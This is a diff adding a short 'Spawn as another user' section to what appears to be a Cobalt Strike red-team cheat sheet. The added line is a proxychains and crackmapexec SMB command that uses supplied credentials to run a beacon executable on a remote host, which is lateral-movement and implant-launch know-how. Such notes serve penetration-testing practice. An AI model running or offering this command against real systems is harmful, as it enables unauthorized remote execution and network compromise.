@@ -523,6 +523,12 @@ Serving HTTP on 127.0.0.1 port 8080 (http://127.0.0.1:8080/) ...
 127.0.0.1 - - [23/Jul/2021 19:24:30] "GET /test.txt HTTP/1.1" 200 -
 ```
 
+## Spawn as another user
+
+```bash
+proxychains -q cme smb <ip> -u <user> -p <password> -x "cd <path> && .\beacon177.exe"
+```
+
 ## References
 
 [https://www.cobaltstrike.com/downloads/csmanual313.pdf](https://www.cobaltstrike.com/downloads/csmanual313.pdf)
